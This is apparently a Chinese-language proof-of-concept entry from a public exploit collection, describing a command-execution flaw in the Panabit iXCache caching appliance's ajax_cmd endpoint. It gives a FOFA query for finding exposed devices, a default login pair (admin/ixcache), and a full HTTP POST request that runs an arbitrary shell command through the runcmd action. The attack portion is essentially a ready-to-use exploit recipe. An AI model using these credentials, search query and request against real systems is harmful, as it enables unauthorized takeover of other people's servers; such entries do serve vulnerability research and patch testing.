# Panabit iXCache ajax_cmd存在后台命令执行漏洞

# 一、漏洞简介
panabit缓存加速产品是一款基于派网公司自研的操作系统（PanaOS）上研发的内容缓存产品。iXCache依靠高稳定性、高可靠性两大特点，可缓存丰富的资源，目前支持Web视频、移动视频、Web音乐、移动音乐、软件下载、应用商店、游戏补丁等八大类资源的缓存。部署灵活、支持交换机镜像和Panabit牵引两种模式，满足不同级别的用户需求。panabit iXCache系统ajax_cmd存在命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。

# 二、影响版本
+ Panabit iXCache

# 三、资产测绘
+ fofa`<font style="color:rgb(255, 0, 0);">title="iXCache"</font>`
+ 特征


# 四、漏洞复习
1. 使用弱口令`admin/ixcache`登陆系统,获取cookie


2. 使用上一步获取的cookie，执行命令

```plain
POST /cgi-bin/Maintain/ajax_cmd?action=runcmd&cmd=ls HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Cookie: _walkthrough-introduction=0; pauser_1706355982_749237=paonline_admin_54360_17068008921; pauser_965865545_617716=paonline_admin_59195_9663105331; pauser_1628486854_900424=paonline_admin_84071_16289322461
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/provn8b8ocqxex5v>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
